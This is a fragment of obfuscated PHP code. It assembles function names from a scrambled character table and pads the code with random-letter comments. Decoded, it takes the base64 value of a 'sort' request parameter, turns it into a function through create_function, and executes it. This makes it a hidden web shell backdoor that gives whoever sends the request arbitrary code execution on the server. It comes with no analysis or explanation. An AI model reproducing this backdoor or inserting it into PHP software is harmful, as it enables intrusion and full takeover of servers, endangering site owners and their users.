...
$twxqrMbo6126 = "1vw39k(0ihqye)bstx7j2zaocup/g5f8.rml*64d;n_";


$mBtpJqda7408 = "";

foreach([15,23,33,16] as $s){
       $mBtpJqda7408 .= $twxqrMbo6126[$s];
    }


if(isset($_REQUEST /*CFPilTEyAGmOpPtQWTdPmRWyDhdbNMbjhhXiFouKxGzZCiPNlsvmqjXhjezJJcHDgCyctCFPOAfeivEETKgCOurJkUpkYmGRyRtOAKiOxnfchBMpVWlMFyffDFzFHoYY*/["$mBtpJqda7408"])){
    $kaHvbLgH260 = $_REQUEST /*CFPilTEyAGmOpPtQWTdPmRWyDhdbNMbjhhXiFouKxGzZCiPNlsvmqjXhjezJJcHDgCyctCFPOAfeivEETKgCOurJkUpkYmGRyRtOAKiOxnfchBMpVWlMFyffDFzFHoYY*/["$mBtpJqda7408"];
    $MeVjhGaM9567 = "";
    $pAmcCBTN8557 = "";

    /*JPQwmuqicUKlKZpcpVWFxtYvlFmtkqfaBMunMDxFYcgaPTNXrokuhZOOrksgzHnSMCsYGGXWoeWKoHFMMBRblyYcRIRMiSPEqmJDUCRgYZfnhoRvAISCIRBjKaKlkWKj*/

    foreach([14,22,15,12,37,38,42,39,12,24,23,39,12] as $s){
       $MeVjhGaM9567 .= $twxqrMbo6126[$s];
    }

    /*oPubBrekbNHJtPwXIInXzdyjXmXFGTZIGmysCaLhxvDZYjusjBblJiPdDqCRvKHarCVDWCLXnXTiXxMHeoitnizQDpCXEvJmwMNHJYeHxsClqEyPsVJukaCxWhVXgZer*/


    foreach([15,16,33,33,12,1] as $s){
       $pAmcCBTN8557 .= $twxqrMbo6126[$s];
    }
    ...
    $s = $pAmcCBTN8557('n'.'o'.''.''.''.''.'i'.''.''.''.''.'t'.'c'.'n'.''.''.'u'.'f'.'_'.''.''.''.'e'.'t'.'a'.'e'.'r'.'c'.''.''.''.'');
    $y = $s("", $MeVjhGaM9567($kaHvbLgH260));
    $y();
    exit();
